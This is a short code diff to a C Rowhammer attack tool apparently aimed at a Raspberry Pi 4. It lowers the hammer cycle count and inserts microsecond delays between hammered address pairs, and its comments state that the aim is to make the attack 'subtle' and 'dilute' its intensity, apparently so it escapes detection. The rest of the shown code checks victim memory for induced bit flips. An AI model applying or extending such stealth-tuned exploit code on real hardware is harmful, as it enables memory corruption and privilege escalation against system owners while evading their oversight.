@@ -15,8 +15,12 @@
 // --- Configuration ---
 
 // Number of cycles for each pair to hammer
-// Tunable: Higher might cause more flips but takes longer.
-#define HAMMER_CYCLES 10000  // Reduced to 1/100 to make attack subtle 
+// Reduced to make attack more subtle and spread out over time
+#define HAMMER_CYCLES 500  // Reduced from 10000 to 500
+
+// Delay between hammering each address pair (microseconds)
+// This "dilutes" the attack intensity
+#define HAMMER_DELAY_US 50  // 50 microseconds delay
 
 // Size of the memory chunk to allocate. 
 // 256MB. RPi 4 has plenty of RAM.
@@ -257,6 +261,9 @@ void hammer_candidates(candidate_t *head, int mode, int hammer_type, int duratio
                     }
                 }
             }
+            
+            // Delay to dilute the attack intensity
+            usleep(HAMMER_DELAY_US);
 
             // --- Check Victim ---
             uintptr_t vctm_pa_base = (curr->pa1 + curr->pa2) / 2;
